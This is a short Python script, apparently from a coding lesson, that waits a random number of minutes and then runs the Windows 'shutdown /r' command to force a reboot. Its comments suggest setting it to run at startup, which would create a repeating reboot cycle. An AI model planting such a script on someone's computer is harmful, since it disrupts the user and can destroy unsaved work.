import time
import random
import os

# use the start_after_login() card
# to make the script run at startup

def reboot():
  n = 60 * random.randint(1,10)
  time.sleep(n)
  # shutdown /r reboots the computer
  #          /t 10 after 10 seconds
  #          /c MESSAGE 
  #             show the message
  #             before reboot
  os.system("shutdown /r /t 10 /c AAA")

# start_after_login()
reboot()
